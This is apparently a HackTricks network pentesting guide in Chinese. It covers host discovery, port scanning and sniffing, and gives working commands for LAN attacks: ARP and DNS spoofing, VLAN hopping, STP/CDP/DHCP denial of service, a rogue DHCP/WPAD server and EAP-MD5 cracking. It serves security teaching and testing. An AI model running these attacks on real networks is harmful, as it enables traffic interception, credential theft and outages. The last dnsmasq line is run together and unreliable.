# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## 从外部发现主机

这将是一个关于如何从**互联网**找到**响应的IP**的**简要部分**。\
在这种情况下，您有一些**IP范围**（甚至可能有几个**范围**），您只需找到**哪些IP在响应**。

### ICMP

这是发现主机是否在线的**最简单**和**最快**的方法。\
您可以尝试发送一些**ICMP**数据包并**期待响应**。最简单的方法是发送一个**回显请求**并期待响应。您可以使用简单的`ping`或使用`fping`进行**范围**测试。\
您还可以使用**nmap**发送其他类型的ICMP数据包（这将避免对常见ICMP回显请求-响应的过滤）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP端口发现

很常见的是发现所有类型的ICMP数据包都被过滤。因此，您能做的就是**尝试查找开放端口**来检查主机是否在线。每个主机有**65535个端口**，所以如果您有一个“大的”范围，您**无法**测试每个主机的**每个端口**是否开放，这将花费太多时间。\
因此，您需要的是一个**快速端口扫描器** ([masscan](https://github.com/robertdavidgraham/masscan)) 和一个**最常用端口**的列表：
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
您也可以使用 `nmap` 执行此步骤，但它较慢，并且 `nmap` 在识别主机时存在一些问题。

### HTTP 端口发现

这只是一个 TCP 端口发现，当您想要 **专注于发现 HTTP** **服务** 时非常有用：
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP端口发现

您还可以尝试检查一些**UDP端口是否开放**，以决定是否应该**更加关注**一个**主机**。由于UDP服务通常**不响应**常规空UDP探测数据包，因此很难判断端口是被过滤还是开放。决定这一点的最简单方法是发送与正在运行的服务相关的包，由于您不知道正在运行哪个服务，您应该根据端口号尝试最可能的服务：
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
提议的 nmap 命令将测试每个 **/24** 范围内的 **前 1000 个 UDP 端口**，但仅此操作将需要 **>20分钟**。如果需要 **最快的结果**，可以使用 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)： `./udp-proto-scanner.pl 199.66.11.53/24` 这将向其 **预期端口** 发送这些 **UDP 探测**（对于 /24 范围，这只需 1 分钟）：_DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP 端口发现
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

在这里，您可以找到一份关于撰写时所有知名Wifi攻击的优秀指南：

{{#ref}}
../pentesting-wifi/
{{#endref}}

## 从内部发现主机

如果您在网络内部，您首先想要做的事情之一就是**发现其他主机**。根据您可以/想要制造的**噪音**，可以执行不同的操作：

### Passive

您可以使用这些工具在连接的网络中被动发现主机：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 活动

请注意，在 [_**从外部发现主机**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP 端口发现_) 中提到的技术也可以在这里 **应用**。\
但是，由于您与其他主机在 **同一网络** 中，您可以做 **更多事情**：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

注意，在 _从外部发现主机_ 中评论的技术 ([_**ICMP**_](./#icmp)) 也可以 **在这里应用**。\
但是，由于您与其他主机在 **同一网络** 中，您可以做 **更多事情**：

- 如果您 **ping** 一个 **子网广播地址**，ping 应该到达 **每个主机**，它们可能会 **响应** **您**： `ping -b 10.10.5.255`
- ping **网络广播地址**，您甚至可以找到 **其他子网** 内的主机： `ping -b 255.255.255.255`
- 使用 `nmap` 的 `-PE`、`-PP`、`-PM` 标志进行主机发现，分别发送 **ICMPv4 回显**、**时间戳**和 **子网掩码请求**： `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan 用于通过 **网络消息** **开启** 计算机。用于开启计算机的魔术数据包仅仅是一个提供了 **MAC Dst** 的数据包，然后在同一个数据包中 **重复 16 次**。\
然后，这种类型的数据包通常以 **以太网 0x0842** 或 **UDP 数据包发送到端口 9**。\
如果 **未提供 \[MAC]**，数据包将发送到 **广播以太网**（广播 MAC 将是被重复的那个）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 扫描主机

一旦您发现了所有要深入扫描的 IP（外部或内部），可以执行不同的操作。

### TCP

- **开放**端口：_SYN --> SYN/ACK --> RST_
- **关闭**端口：_SYN --> RST/ACK_
- **过滤**端口：_SYN --> \[无响应]_
- **过滤**端口：_SYN --> ICMP 消息_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

有两种选项可以扫描UDP端口：

- 发送一个**UDP数据包**并检查响应_**ICMP不可达**_，如果端口是**关闭**的（在许多情况下，ICMP会被**过滤**，因此您将无法收到端口是关闭还是打开的任何信息）。
- 发送**格式化的数据报**以引发**服务**的响应（例如，DNS、DHCP、TFTP等，如_nmap-payloads_中列出）。如果您收到**响应**，那么端口是**打开**的。

**Nmap**将使用“-sV”**混合这两种**选项（UDP扫描非常慢），但请注意，UDP扫描比TCP扫描慢：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP 扫描

**SCTP (流控制传输协议)** 旨在与 **TCP (传输控制协议)** 和 **UDP (用户数据报协议)** 一起使用。其主要目的是促进通过 IP 网络传输电话数据，反映出许多 **信令系统 7 (SS7)** 中的可靠性特征。**SCTP** 是 **SIGTRAN** 协议族的核心组成部分，旨在通过 IP 网络传输 SS7 信号。

各种操作系统提供对 **SCTP** 的支持，如 **IBM AIX**、**Oracle Solaris**、**HP-UX**、**Linux**、**Cisco IOS** 和 **VxWorks**，这表明它在电信和网络领域的广泛接受和实用性。

nmap 提供了两种不同的 SCTP 扫描： _-sY_ 和 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 和 IPS 规避

{{#ref}}
ids-evasion.md
{{#endref}}

### **更多 nmap 选项**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 揭示内部 IP 地址

**配置错误的路由器、防火墙和网络设备** 有时会使用 **非公开源地址** 对网络探测做出响应。**tcpdump** 可用于识别在测试期间从私有地址接收的数据包。具体来说，在 Kali Linux 上，可以在 **eth2 接口** 上捕获数据包，该接口可以从公共互联网访问。需要注意的是，如果您的设置位于 NAT 或防火墙后面，这些数据包可能会被过滤掉。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 嗅探

通过嗅探，您可以通过查看捕获的帧和数据包来了解 IP 范围、子网大小、MAC 地址和主机名的详细信息。如果网络配置错误或交换 fabric 处于压力下，攻击者可以通过被动网络嗅探捕获敏感材料。

如果交换以太网网络配置正确，您将只看到广播帧和发往您 MAC 地址的材料。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
可以通过SSH会话使用Wireshark作为图形用户界面实时捕获远程机器的包。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

显然。

### 捕获凭据

您可以使用像 [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) 这样的工具从 pcap 或实时接口中解析凭据。

## LAN 攻击

### ARP 欺骗

ARP 欺骗是指发送无偿的 ARP 响应，以指示某台机器的 IP 地址具有我们设备的 MAC 地址。然后，受害者将更改 ARP 表，并在每次想要联系伪造的 IP 时与我们的机器联系。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM溢出

通过发送大量具有不同源MAC地址的数据包来溢出交换机的CAM表。当CAM表满时，交换机开始像集线器一样工作（广播所有流量）。
```bash
macof -i <interface>
```
在现代交换机中，这个漏洞已经被修复。

### 802.1Q VLAN / DTP 攻击

#### 动态干道

**动态干道协议 (DTP)** 被设计为一个链路层协议，以便于自动化的干道系统，允许交换机自动选择干道模式 (Trunk) 或非干道模式的端口。**DTP** 的部署通常被视为网络设计不佳的标志，强调了仅在必要时手动配置干道的重要性，并确保适当的文档记录。

默认情况下，交换机端口设置为动态自动模式，这意味着它们准备在邻近交换机的提示下启动干道。当渗透测试者或攻击者连接到交换机并发送 DTP Desirable 帧时，会引发安全问题，迫使端口进入干道模式。这一行为使攻击者能够通过 STP 帧分析枚举 VLAN，并通过设置虚拟接口来绕过 VLAN 分段。

许多交换机默认存在 DTP，敌手可以利用这一点来模仿交换机的行为，从而获得对所有 VLAN 流量的访问。脚本 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 被用来监控接口，揭示交换机是否处于默认、干道、动态、自动或接入模式——后者是唯一免受 VLAN 跳跃攻击的配置。该工具评估交换机的脆弱性状态。

如果发现网络脆弱性，可以使用 _**Yersinia**_ 工具通过 DTP 协议“启用干道”，以便观察来自所有 VLAN 的数据包。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

要枚举VLAN，也可以使用脚本 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** 生成DTP Desirable帧。**在任何情况下都不要中断脚本。它每三秒注入一次DTP Desirable。**在交换机上动态创建的干道通道仅持续五分钟。五分钟后，干道将失效。**
```
sudo python3 DTPHijacking.py --interface eth0
```
我想指出，**Access/Desirable (0x03)** 表示 DTP 帧是 Desirable 类型，这告诉端口切换到 Trunk 模式。并且 **802.1Q/802.1Q (0xa5)** 表示 **802.1Q** 封装类型。

通过分析 STP 帧，**我们了解到 VLAN 30 和 VLAN 60 的存在。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 攻击特定 VLAN

一旦你知道 VLAN ID 和 IP 值，你可以 **配置一个虚拟接口来攻击特定 VLAN**。\
如果 DHCP 不可用，则使用 _ifconfig_ 设置静态 IP 地址。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自动VLAN跳跃

讨论的攻击**动态干线和创建虚拟接口以发现其他VLAN中的主机**是由工具**[https://github.com/nccgroup/vlan-hopping---frogger](https://github.com/nccgroup/vlan-hopping---frogger)**自动执行的。

#### 双重标记

如果攻击者知道**受害主机的MAC、IP和VLAN ID的值**，他可以尝试**用其指定的VLAN和受害者的VLAN双重标记一个帧**并发送一个数据包。由于**受害者无法与攻击者连接**，因此**攻击者的最佳选择是通过UDP与可以执行一些有趣操作的协议进行通信**（如SNMP）。

攻击者的另一个选择是发起**TCP端口扫描，伪装成一个由攻击者控制并且受害者可以访问的IP**（可能通过互联网）。然后，攻击者可以在他拥有的第二个主机上嗅探是否接收到来自受害者的一些数据包。

![](<../../images/image (190).png>)

要执行此攻击，可以使用scapy：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

如果您**可以访问直接连接的交换机**，您就有能力**绕过 VLAN 分段**。只需**将端口切换到干道模式**（也称为 trunk），创建具有目标 VLAN ID 的虚拟接口，并配置 IP 地址。您可以尝试动态请求地址（DHCP），或者可以静态配置。具体取决于情况。

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

在某些环境中，例如访客无线网络，实施了**端口隔离（也称为私有 VLAN）**设置，以防止连接到无线接入点的客户端直接相互通信。然而，已经识别出一种可以规避这些隔离措施的技术。该技术利用网络 ACL 的缺失或配置不当，使得 IP 数据包能够通过路由器路由到同一网络上的另一个客户端。

攻击是通过创建一个**携带目标客户端 IP 地址但带有路由器 MAC 地址的包**来执行的。这导致路由器错误地将数据包转发给目标客户端。这种方法类似于双标记攻击中使用的方法，其中利用可访问受害者的主机的能力来利用安全漏洞。

**攻击的关键步骤：**

1. **构造数据包：** 特别构造一个数据包，以包含目标客户端的 IP 地址，但带有路由器的 MAC 地址。
2. **利用路由器行为：** 将构造的数据包发送到路由器，由于配置原因，路由器将数据包重定向到目标客户端，绕过私有 VLAN 设置提供的隔离。

### VTP Attacks

VTP（VLAN Trunking Protocol）集中管理 VLAN。它利用修订号来维护 VLAN 数据库的完整性；任何修改都会增加此数字。交换机采用具有更高修订号的配置，更新自己的 VLAN 数据库。

#### VTP Domain Roles

- **VTP Server:** 管理 VLAN——创建、删除、修改。它向域成员广播 VTP 通告。
- **VTP Client:** 接收 VTP 通告以同步其 VLAN 数据库。此角色限制本地 VLAN 配置修改。
- **VTP Transparent:** 不参与 VTP 更新，但转发 VTP 通告。不受 VTP 攻击影响，保持修订号为零。

#### VTP Advertisement Types

- **Summary Advertisement:** 每 300 秒由 VTP 服务器广播，携带重要的域信息。
- **Subset Advertisement:** 在 VLAN 配置更改后发送。
- **Advertisement Request:** 由 VTP 客户端发出，请求 Summary Advertisement，通常是响应检测到更高的配置修订号。

VTP 漏洞仅通过干道端口可被利用，因为 VTP 通告仅通过这些端口传播。DTP 攻击后的场景可能会转向 VTP。像 Yersinia 这样的工具可以促进 VTP 攻击，旨在清除 VLAN 数据库，有效干扰网络。

注意：本讨论涉及 VTP 版本 1（VTPv1）。
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
在Yersinia的图形模式中，选择删除所有VTP VLAN选项以清除VLAN数据库。

### STP攻击

**如果您无法在接口上捕获BPDU帧，那么您在STP攻击中成功的可能性不大。**

#### **STP BPDU DoS**

发送大量的BPDUs TCP（拓扑变化通知）或Conf（在创建拓扑时发送的BPDUs），交换机会过载并停止正常工作。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP攻击**

当发送TCP时，交换机的CAM表将在15秒内被删除。然后，如果您持续发送这种数据包，CAM表将持续重启（或每15秒重启一次），当它重启时，交换机的行为就像一个集线器。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻击者模拟交换机的行为，以成为网络的 STP 根。然后，更多的数据将通过他传输。当你连接到两个不同的交换机时，这一点很有趣。\
这是通过发送 BPDUs CONF 数据包来完成的，声称 **优先级** 值低于实际根交换机的实际优先级。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**如果攻击者连接到两个交换机，他可以成为新树的根，所有在这些交换机之间的流量将通过他**（将执行MITM攻击）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 攻击

CISCO Discovery Protocol (CDP) 对于 CISCO 设备之间的通信至关重要，使它们能够 **相互识别并共享配置细节**。

#### 被动数据收集 <a href="#id-0e0f" id="id-0e0f"></a>

CDP 被配置为通过所有端口广播信息，这可能导致安全风险。攻击者在连接到交换机端口时，可以部署网络嗅探器，如 **Wireshark**、**tcpdump** 或 **Yersinia**。此操作可以揭示有关网络设备的敏感数据，包括其型号和运行的 Cisco IOS 版本。攻击者可能会针对识别出的 Cisco IOS 版本中的特定漏洞。

#### 诱导 CDP 表泛洪 <a href="#id-0d6a" id="id-0d6a"></a>

一种更激进的方法是通过假装是合法的 CISCO 设备来发起拒绝服务 (DoS) 攻击，从而淹没交换机的内存。以下是使用 Yersinia 这一网络工具发起此类攻击的命令序列：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
在此次攻击中，交换机的CPU和CDP邻居表负担沉重，导致通常所称的**“网络瘫痪”**，这是由于过度的资源消耗。

#### CDP冒充攻击
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
您还可以使用 [**scapy**](https://github.com/secdev/scapy/)。确保使用 `scapy/contrib` 包进行安装。

### VoIP攻击和VoIP Hopper工具

VoIP电话与IoT设备的集成日益增加，提供了通过特殊电话号码解锁门或控制恒温器等功能。然而，这种集成可能会带来安全风险。

工具 [**voiphopper**](http://voiphopper.sourceforge.net) 旨在在各种环境中模拟VoIP电话（Cisco、Avaya、Nortel、Alcatel-Lucent）。它使用CDP、DHCP、LLDP-MED和802.1Q ARP等协议发现语音网络的VLAN ID。

**VoIP Hopper** 为Cisco发现协议（CDP）提供三种模式：

1. **嗅探模式** (`-c 0`): 分析网络数据包以识别VLAN ID。
2. **欺骗模式** (`-c 1`): 生成自定义数据包，模仿实际VoIP设备的数据包。
3. **使用预制数据包的欺骗模式** (`-c 2`): 发送与特定Cisco IP电话型号相同的数据包。

速度优先的模式是第三种。它需要指定：

- 攻击者的网络接口（`-i` 参数）。
- 被模拟的VoIP设备名称（`-E` 参数），遵循Cisco命名格式（例如，SEP后跟MAC地址）。

在企业环境中，为了模仿现有的VoIP设备，可以：

- 检查电话上的MAC标签。
- 浏览电话的显示设置以查看型号信息。
- 将VoIP设备连接到笔记本电脑，并使用Wireshark观察CDP请求。

在第三种模式下执行工具的示例命令为：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 攻击

#### 枚举
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**两种类型的 DoS** 可以针对 DHCP 服务器执行。第一种是 **模拟足够多的虚假主机以使用所有可能的 IP 地址**。\
此攻击仅在您能够看到 DHCP 服务器的响应并完成协议时有效 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server))。例如，这在 **Wifi 网络中是不可行的**。

执行 DHCP DoS 的另一种方法是发送 **DHCP-RELEASE 数据包，源代码使用每个可能的 IP**。然后，服务器会认为每个人都已完成使用该 IP。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
一种更自动化的方法是使用工具 [DHCPing](https://github.com/kamorin/DHCPig)

您可以使用提到的 DoS 攻击迫使客户端在环境中获取新租约，并耗尽合法服务器，使其变得无响应。因此，当合法客户端尝试重新连接时，**您可以提供下一个攻击中提到的恶意值**。

#### 设置恶意值

可以使用位于 `/usr/share/responder/DHCP.py` 的 DHCP 脚本设置一个流氓 DHCP 服务器。这对于网络攻击非常有用，例如通过将流量重定向到恶意服务器来捕获 HTTP 流量和凭据。然而，设置流氓网关的效果较差，因为它仅允许捕获来自客户端的出站流量，错过来自真实网关的响应。相反，建议设置流氓 DNS 或 WPAD 服务器以进行更有效的攻击。

以下是配置流氓 DHCP 服务器的命令选项：

- **我们的 IP 地址（网关广告）**：使用 `-i 10.0.0.100` 将您的机器 IP 广告为网关。
- **本地 DNS 域名**：可选地，使用 `-d example.org` 设置本地 DNS 域名。
- **原始路由器/网关 IP**：使用 `-r 10.0.0.1` 指定合法路由器或网关的 IP 地址。
- **主 DNS 服务器 IP**：使用 `-p 10.0.0.100` 设置您控制的流氓 DNS 服务器的 IP 地址。
- **次级 DNS 服务器 IP**：可选地，使用 `-s 10.0.0.1` 设置次级 DNS 服务器 IP。
- **本地网络的子网掩码**：使用 `-n 255.255.255.0` 定义本地网络的子网掩码。
- **DHCP 流量的接口**：使用 `-I eth1` 在特定网络接口上监听 DHCP 流量。
- **WPAD 配置地址**：使用 `-w “http://10.0.0.100/wpad.dat”` 设置 WPAD 配置的地址，以协助网络流量拦截。
- **伪造默认网关 IP**：包括 `-S` 以伪造默认网关 IP 地址。
- **响应所有 DHCP 请求**：包括 `-R` 使服务器响应所有 DHCP 请求，但请注意这会产生噪音并可能被检测到。

通过正确使用这些选项，可以有效地建立一个流氓 DHCP 服务器以拦截网络流量。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP攻击**

以下是可以针对802.1X实现使用的一些攻击战术：

- 通过EAP进行主动的暴力破解密码
- 使用格式错误的EAP内容攻击RADIUS服务器 _\*\*_(利用)
- 捕获EAP消息并进行离线密码破解（EAP-MD5和PEAP）
- 强制EAP-MD5身份验证以绕过TLS证书验证
- 在使用集线器或类似设备进行身份验证时注入恶意网络流量

如果攻击者位于受害者和身份验证服务器之间，他可以尝试将身份验证协议降级（如有必要）为EAP-MD5并捕获身份验证尝试。然后，他可以使用以下方法进行暴力破解：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻击 <a href="#id-6196" id="id-6196"></a>

**FHRP**（第一跳冗余协议）是一类旨在**创建热冗余路由系统**的网络协议。通过FHRP，物理路由器可以组合成一个单一的逻辑设备，从而提高容错能力并帮助分配负载。

**思科系统工程师开发了两种FHRP协议，GLBP和HSRP。**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

已知存在三种版本的路由信息协议（RIP）：RIP、RIPv2和RIPng。RIP和RIPv2通过UDP的520端口向对等体发送数据报，而RIPng则通过IPv6组播向UDP的521端口广播数据报。RIPv2引入了MD5认证。另一方面，RIPng没有内置认证，而是依赖于IPv6中的可选IPsec AH和ESP头。

- **RIP和RIPv2：** 通过UDP数据报在520端口进行通信。
- **RIPng：** 利用UDP的521端口通过IPv6组播广播数据报。

请注意，RIPv2支持MD5认证，而RIPng不包括内置认证，依赖于IPv6中的IPsec AH和ESP头。

### EIGRP 攻击

**EIGRP（增强型内部网关路由协议）**是一种动态路由协议。**它是一种距离矢量协议。** 如果没有**认证**和被动接口的配置，**入侵者**可以干扰EIGRP路由并导致**路由表中毒**。此外，EIGRP网络（换句话说，自治系统）**是扁平的，没有划分为任何区域**。如果**攻击者注入一条路由**，这条路由很可能会在自治EIGRP系统中**传播**。

攻击EIGRP系统需要**与合法的EIGRP路由器建立邻居关系**，这打开了许多可能性，从基本侦察到各种注入。

[**FRRouting**](https://frrouting.org/) 允许您实现**支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器。** 您只需在攻击者的系统上部署它，实际上可以假装成为路由域中的合法路由器。

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) 具有拦截EIGRP（增强型内部网关路由协议）广播的能力。它还允许注入数据包，可用于更改路由配置。

### OSPF

在开放最短路径优先（OSPF）协议中，**通常使用MD5认证以确保路由器之间的安全通信**。然而，这一安全措施可能会被像Loki和John the Ripper这样的工具破坏。这些工具能够捕获和破解MD5哈希，暴露认证密钥。一旦获得该密钥，就可以用来引入新的路由信息。要配置路由参数并建立被破坏的密钥，分别使用_注入_和_连接_选项卡。

- **捕获和破解MD5哈希：** 使用Loki和John the Ripper等工具。
- **配置路由参数：** 通过_注入_选项卡进行。
- **设置被破坏的密钥：** 密钥在_连接_选项卡下配置。

### 其他通用工具和资源

- [**Above**](https://github.com/c4s73r/Above)：扫描网络流量并查找漏洞的工具
- 您可以在[**这里**](https://github.com/Sab0tag3d/MITM-cheatsheet)找到一些**关于网络攻击的更多信息**。

## **欺骗**

攻击者通过发送虚假的DHCP响应来配置网络中新成员的所有网络参数（GW、IP、DNS）。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

查看[上一节](./#arp-spoofing)。

### ICMPRedirect

ICMP重定向是指发送一个类型为1，代码为5的ICMP数据包，表示攻击者是到达某个IP的最佳方式。然后，当受害者想要联系该IP时，它将通过攻击者发送数据包。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻击者将解析受害者请求的某些（或所有）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用 dnsmasq 配置自己的 DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
